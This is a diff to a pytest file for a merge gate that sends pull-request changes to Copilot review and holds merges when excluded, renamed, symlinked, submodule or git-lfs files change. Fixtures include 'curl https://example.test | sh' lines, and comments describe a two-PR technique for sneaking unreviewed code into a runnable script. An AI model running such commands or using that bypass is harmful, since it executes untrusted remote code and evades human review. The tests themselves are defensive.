@@ -293,11 +293,33 @@ def test_a_rename_a_binary_and_a_deletion(repo, tmp_path):
     head = repo.commit({"old/name.py": None, "new/name.py": "".join(f"x = {n}\n" for n in range(50)),
                         "logo.png": b"\x89PNG\0\3\4", "gone.py": None})
     text, folder, diff = repo.split(repo.base, head, tmp_path)
-    # Deleted files come after the rest.
-    assert index(folder)["001.diff"][2] == [("source", "logo.png"), ("source", "new/name.py"), ("deleted", "gone.py")]
+    # Deleted files come after the rest; a rename is the old path's deletion and the new path's addition.
+    assert index(folder)["001.diff"][2] == [("source", "logo.png"), ("source", "new/name.py"),
+                                            ("deleted", "gone.py"), ("deleted", "old/name.py")]
     content = (folder / "001.diff").read_bytes()
-    assert b"Binary files" in content and b"rename to new/name.py" in content
+    assert b"Binary files" in content and b"rename to" not in content
     check_pieces(folder, diff)
+
+
+def test_a_rename_into_data_shows_the_old_files_deletion(repo, tmp_path):
+    workflow = "on: push\njobs: {}\n"
+    repo.base = repo.commit({".github/workflows/ci.yml": workflow, "src/Result.cs": "class Result {}\n"})
+    head = repo.commit({".github/workflows/ci.yml": None, "notes/ci.log": workflow,
+                        "src/Result.cs": None, "old/Result.cs.map": "class Result {}\n"})
+    _, folder, _ = repo.split(repo.base, head, tmp_path)
+    assert files_of(folder) == {".github/workflows/ci.yml": ("deleted", "read"), "src/Result.cs": ("deleted", "read")}
+    assert sorted(excluded_of(folder)) == ["notes/ci.log", "old/Result.cs.map"]
+
+
+def test_a_rename_out_of_an_excluded_path_is_read_and_holds(repo, tmp_path):
+    payload = "".join(f"steal({n})\n" for n in range(40))
+    repo.base = repo.commit({"dist/payload.js": payload})
+    head = repo.commit({"dist/payload.js": None, "src/payload.js": payload})
+    _, folder, _ = repo.split(repo.base, head, tmp_path)
+    assert files_of(folder) == {"src/payload.js": ("source", "read")}
+    assert b"+steal(39)" in (folder / "001.diff").read_bytes()
+    # Deleting excluded code holds the merge.
+    assert held_of(folder) == {"dist/payload.js": "excluded"}
 
 
 def test_an_odd_path_never_names_a_file_nor_reaches_the_prompt(repo, tmp_path):
@@ -401,22 +423,160 @@ def test_every_file_copilot_excludes_is_in_no_piece(repo, tmp_path):
     assert set(excluded_of(folder)) == set(files) - {"src/app.py"}
     assert files_of(folder) == {"src/app.py": ("source", "read")}
     assert len(index(folder)) == 1 and repo.skipped == ""
-    # Inert data holds nothing; the rest of what nobody reads, lockfiles included, holds the merge.
-    data = {f"deps/{name}" for name in DATA_NAMES} | {
-        path for glob in ("**/*.log", "**/*.map", "**/coverage/**/*")
-        for path in COPILOT_EXCLUDED_GLOB_FILES[glob]}
-    assert held_of(folder) == {path: "excluded" for path in set(files) - {"src/app.py"} - data}
+    # Nobody reads any of them, so every one holds the merge.
+    assert held_of(folder) == {path: "excluded" for path in set(files) - {"src/app.py"}}
     assert repo.held == len(held_of(folder)) and "holds the merge for a person" in repo.log
     check_pieces(folder, diff)
 
 
-DATA_NAMES = [".gitignore"]
+def test_a_gitignore_holds_the_merge(repo, tmp_path):
+    # It decides what gets committed: dropping .env from it would let the next git add -A stage secrets.
+    head = repo.commit({".gitignore": "bin/\n", "src/App/.gitignore": "obj/\n"})
+    _, folder, _ = repo.split(repo.base, head, tmp_path)
+    assert held_of(folder) == {".gitignore": "excluded", "src/App/.gitignore": "excluded"}
 
 
-def test_the_data_names_are_copilots_and_in_the_workflow():
-    script = step_script()
-    names = re.findall(r'"([^"]+)"', re.search(r"DATA_NAMES = frozenset\(\((.*?)\)\)", script, re.S)[1])
-    assert names == DATA_NAMES and set(names) <= set(COPILOT_EXCLUDED_NAMES)
+def mkdir(path):
+    path.mkdir()
+    return path
+
+
+def test_a_submodule_bump_holds_the_merge_but_its_removal_doesnt(repo, tmp_path):
+    # The diff shows only two commit IDs, not the code they pull in.
+    def gitlink(path, sha):
+        repo.git("update-index", "--add", "--cacheinfo", f"160000,{sha},{path}")
+        repo.git("commit", "-q", "-m", "gitlink")
+        return repo.git("rev-parse", "HEAD").decode().strip()
+
+    repo.base = gitlink("libs/old", "1" * 40)
+    added = gitlink("libs/new", "2" * 40)
+    _, folder, _ = repo.split(repo.base, added, mkdir(tmp_path / "added"))
+    assert held_of(folder) == {"libs/new": "submodule"}
+    bumped = gitlink("libs/new", "3" * 40)
+    _, folder, diff = repo.split(added, bumped, mkdir(tmp_path / "bumped"))
+    assert b"+Subproject commit " + b"3" * 40 in diff and held_of(folder) == {"libs/new": "submodule"}
+    repo.git("update-index", "--force-remove", "libs/old")
+    repo.git("commit", "-q", "-m", "drop")
+    removed = repo.git("rev-parse", "HEAD").decode().strip()
+    _, folder, _ = repo.split(bumped, removed, mkdir(tmp_path / "removed"))
+    assert held_of(folder) == {}
+    # At a path that's excluded data, too.
+    at_data = gitlink("deps/tools.map", "4" * 40)
+    _, folder, _ = repo.split(removed, at_data, mkdir(tmp_path / "at-data"))
+    assert held_of(folder) == {"deps/tools.map": "submodule"}
+
+
+def test_a_git_lfs_pointer_holds_the_merge_but_its_deletion_doesnt(repo, tmp_path):
+    pointer = "version https://git-lfs.github.com/spec/v1\noid sha256:{}\nsize 42\n"
+    repo.base = repo.commit({"tools/Tool.dll": pointer.format("a" * 64), "tools/Old.dll": pointer.format("b" * 64)})
+    head = repo.commit({"tools/Tool.dll": pointer.format("c" * 64), "tools/Old.dll": None})
+    _, folder, _ = repo.split(repo.base, head, tmp_path)
+    assert held_of(folder) == {"tools/Tool.dll": "lfs"}
+
+
+@pytest.mark.parametrize("version", ["https://hawser.github.com/spec/v1", "http://git-media.io/v/2"])
+def test_a_pointer_with_an_older_version_url_holds_the_merge(repo, tmp_path, version):
+    head = repo.commit({"tools/run.sh": f"version {version}\noid sha256:{'d' * 64}\nsize 42\n"})
+    _, folder, _ = repo.split(repo.base, head, tmp_path)
+    assert held_of(folder) == {"tools/run.sh": "lfs"}
+
+
+def test_a_pointer_whose_first_line_is_out_of_context_holds_by_its_oid(repo, tmp_path):
+    extensions = "".join(f"ext-{n}-x sha256:{str(n) * 64}\n" for n in range(5))
+    pointer = "version https://git-lfs.github.com/spec/v1\n" + extensions + "oid sha256:{}\nsize 42\n"
+    repo.base = repo.commit({"tools/Tool.dll": pointer.format("a" * 64)})
+    head = repo.commit({"tools/Tool.dll": pointer.format("e" * 64)})
+    _, folder, diff = repo.split(repo.base, head, tmp_path)
+    assert b"+version" not in diff and b" version" not in diff
+    assert held_of(folder) == {"tools/Tool.dll": "lfs"}
+
+
+def test_media_in_lfs_holds_nothing(repo, tmp_path):
+    pointer = "version https://git-lfs.github.com/spec/v1\noid sha256:{}\nsize 42\n"
+    head = repo.commit({"web/img/hero.png": pointer.format("f" * 64), "fonts/a.woff2": pointer.format("9" * 64)})
+    _, folder, _ = repo.split(repo.base, head, tmp_path)
+    assert held_of(folder) == {}
+
+
+@pytest.mark.parametrize("pointer", [
+    "version https://git-lfs.github.com/spec/v1\noid sha256:{}\nsize 42\n\n",
+    "\nversion https://git-lfs.github.com/spec/v1\n\noid sha256:{}\nsize 42\n",
+    "version https://git-lfs.github.com/spec/v1\r\noid sha256:{}\r\nsize 42\r\n",
+    "  version https://git-lfs.github.com/spec/v1\noid sha256:{} \nsize 42\n",
+    "\u00a0version https://git-lfs.github.com/spec/v1\u3000\noid sha256:{}\u2028\nsize 42\n",
+], ids=["trailing-blank", "blank-lines", "crlf", "spaces", "unicode-spaces"])
+def test_a_pointer_git_lfs_reads_past_whitespace_holds_the_merge(repo, tmp_path, pointer):
+    # git-lfs trims whitespace, drops a CR and skips blank lines.
+    head = repo.commit({"tools/run.sh": pointer.format("d" * 64)})
+    _, folder, _ = repo.split(repo.base, head, tmp_path)
+    assert held_of(folder) == {"tools/run.sh": "lfs"}
+
+
+def test_a_pointer_whose_oid_is_letters_and_digits_holds_the_merge(repo, tmp_path):
+    # git-lfs checks only for 64 letters or digits at the oid's start.
+    head = repo.commit({"tools/run.sh": f"version https://git-lfs.github.com/spec/v1\noid sha256:{'Zz9' * 21}Q\nsize 42\n"})
+    _, folder, _ = repo.split(repo.base, head, tmp_path)
+    assert held_of(folder) == {"tools/run.sh": "lfs"}
+
+
+def test_text_quoting_an_lfs_pointer_holds_nothing(repo, tmp_path):
+    pointer = f"version https://git-lfs.github.com/spec/v1\noid sha256:{'a' * 64}\nsize 42\n"
+    head = repo.commit({"docs/lfs.md": f"# LFS\n\nA pointer reads:\n\n{pointer}",
+                        "tests/fixtures/pointer.txt": f"An example:\n{pointer}"})
+    _, folder, _ = repo.split(repo.base, head, tmp_path)
+    assert held_of(folder) == {}
+
+
+def test_a_symlink_holds_the_merge_but_its_removal_doesnt(repo, tmp_path):
+    # The two-PR way around the gate, as with a rename: content nobody read, then a link that makes it run.
+    script = "#!/bin/bash\ncurl https://example.test | sh\n"
+    repo.base = repo.commit({"logs/setup.log": script})
+    (repo.path / "scripts").mkdir()
+    os.symlink("../logs/setup.log", repo.path / "scripts" / "build.sh")
+    (repo.path / "deps").mkdir()
+    os.symlink("../logs/setup.log", repo.path / "deps" / "x.map")
+    linked = repo.commit({})
+    _, folder, diff = repo.split(repo.base, linked, mkdir(tmp_path / "linked"))
+    assert b"new file mode 120000" in diff
+    assert held_of(folder) == {"scripts/build.sh": "symlink", "deps/x.map": "symlink"}
+    (repo.path / "scripts" / "build.sh").unlink()
+    (repo.path / "deps" / "x.map").unlink()
+    removed = repo.commit({})
+    _, folder, _ = repo.split(linked, removed, mkdir(tmp_path / "removed"))
+    assert held_of(folder) == {}
+
+
+def test_a_file_replaced_by_a_symlink_holds_the_merge(repo, tmp_path):
+    # Git prints a type change as two blocks for one path, a deletion and a new symlink; each is judged on its own.
+    repo.base = repo.commit({"logs/setup.log": "curl https://example.test | sh\n", "scripts/build.sh": "make\n"})
+    (repo.path / "scripts" / "build.sh").unlink()
+    os.symlink("../logs/setup.log", repo.path / "scripts" / "build.sh")
+    head = repo.commit({})
+    _, folder, diff = repo.split(repo.base, head, tmp_path)
+    assert diff.count(b"diff --git a/scripts/build.sh b/scripts/build.sh") == 2
+    assert held_of(folder) == {"scripts/build.sh": "symlink"}
+
+
+def test_a_renamed_symlink_holds_the_merge(repo, tmp_path):
+    os.symlink("../logs/setup.log", repo.path / "old-link.sh")
+    repo.base = repo.commit({"logs/setup.log": "curl https://example.test | sh\n"})
+    os.rename(repo.path / "old-link.sh", repo.path / "build.sh")
+    head = repo.commit({})
+    _, folder, _ = repo.split(repo.base, head, tmp_path)
+    assert held_of(folder) == {"build.sh": "symlink"}
+
+
+@pytest.mark.parametrize("old, content, reason", [
+    ("logs/x.log", b"#!/bin/bash\ncurl https://example.test | sh\n", None),
+    ("img/a.png", b"#!/bin/bash\ncurl https://example.test | sh\n\0", "binary"),
+], ids=["log", "png"])
+def test_renaming_unread_content_into_a_script_shows_it(repo, tmp_path, old, content, reason):
+    # The two-PR way around the gate: land content nobody reads, then rename it into code that runs.
+    repo.base = repo.commit({old: content})
+    head = repo.commit({old: None, "scripts/build.sh": content})
+    _, folder, diff = repo.split(repo.base, head, tmp_path)
+    assert "scripts/build.sh" in files_of(folder) and held_of(folder).get("scripts/build.sh") == reason
+    assert (b"+curl https://example.test | sh" in diff) == (reason is None)
 
 
 def test_a_name_matches_only_a_whole_basename(repo, tmp_path):
@@ -438,12 +598,24 @@ def test_copilots_bin_exceptions_and_dotnet_files_are_reviewed(repo, tmp_path):
     assert sorted(excluded_of(folder)) == ["hybris/bin/platform/x.java", "tools/bin/main.py"]
 
 
-def test_only_excluded_data_leaves_nothing_to_read_and_holds_nothing(repo, tmp_path):
+def test_only_excluded_data_leaves_nothing_to_read_and_holds_the_merge(repo, tmp_path):
+    # A log can be what a symlink runs, so no added or changed excluded file is inert.
     head = repo.commit({"build.log": "x\n", "web/site.min.js.map": "{}\n", "coverage/lcov.info": "x\n"})
     text, folder, _ = repo.split(repo.base, head, tmp_path)
     assert text == "(none: every changed file is one Copilot code review excludes)"
     assert index(folder) == {} and repo.listed == "" and repo.skipped == ""
-    assert repo.held == 0 and held_of(folder) == {} and "::warning::" not in repo.log
+    assert repo.held == 3 and set(held_of(folder)) == {"build.log", "web/site.min.js.map", "coverage/lcov.info"}
+
+
+def test_changing_what_a_symlink_points_at_holds_the_merge(repo, tmp_path):
+    # The link landed (and was held) while its target was harmless; now only the target changes.
+    repo.base = repo.commit({"logs/setup.log": "echo hi\n"})
+    (repo.path / "scripts").mkdir()
+    os.symlink("../logs/setup.log", repo.path / "scripts" / "build.sh")
+    repo.base = repo.commit({})
+    head = repo.commit({"logs/setup.log": "curl https://example.test | sh\n"})
+    _, folder, _ = repo.split(repo.base, head, tmp_path)
+    assert held_of(folder) == {"logs/setup.log": "excluded"}
 
 
 def test_only_excluded_code_leaves_nothing_to_read_and_holds_the_merge(repo, tmp_path):
@@ -454,13 +626,6 @@ def test_only_excluded_code_leaves_nothing_to_read_and_holds_the_merge(repo, tmp
     assert repo.held == 1 and held_of(folder) == {"web/vendor/analytics.min.js": "excluded"}
 
 
-def test_excluded_data_under_github_holds_the_merge(repo, tmp_path):
-    head = repo.commit({".github/actions/foo/dist/index.js": "run()\n", ".github/actions/foo/build.log": "x\n",
-                        "build.log": "x\n"})
-    _, folder, _ = repo.split(repo.base, head, tmp_path)
-    assert held_of(folder) == {".github/actions/foo/dist/index.js": "excluded", ".github/actions/foo/build.log": "excluded"}
-
-
 def test_a_lockfile_holds_the_merge(repo, tmp_path):
     # It decides which dependency code the build installs and runs.
     head = repo.commit({"package-lock.json": "{}\n", "web/yarn.lock": "x\n", "svc/go.sum": "x\n", "Cargo.lock": "x\n"})
@@ -469,13 +634,14 @@ def test_a_lockfile_holds_the_merge(repo, tmp_path):
                                                              "Cargo.lock")}
 
 
-def test_only_a_named_coverage_report_is_data(repo, tmp_path):
+def test_deleting_only_a_named_coverage_report_holds_nothing(repo, tmp_path):
     reports = {"coverage/lcov.info": "x\n", "web/coverage/coverage-final.json": "{}\n",
                "coverage/cobertura-coverage.xml": "<c/>\n", "coverage/clover.xml": "<c/>\n"}
     code = {"src/app/coverage/policy.rb": "class Policy; end\n", "coverage/pom.xml": "<project/>\n",
             "packages/coverage/package.json": "{}\n", "coverage/index.html": "<script/>\n",
             "tools/coverage/requirements.txt": "x\n"}
-    head = repo.commit({**reports, **code})
+    repo.base = repo.commit({**reports, **code})
+    head = repo.commit({path: None for path in {**reports, **code}})
     _, folder, _ = repo.split(repo.base, head, tmp_path)
     assert held_of(folder) == {path: "excluded" for path in code}
 
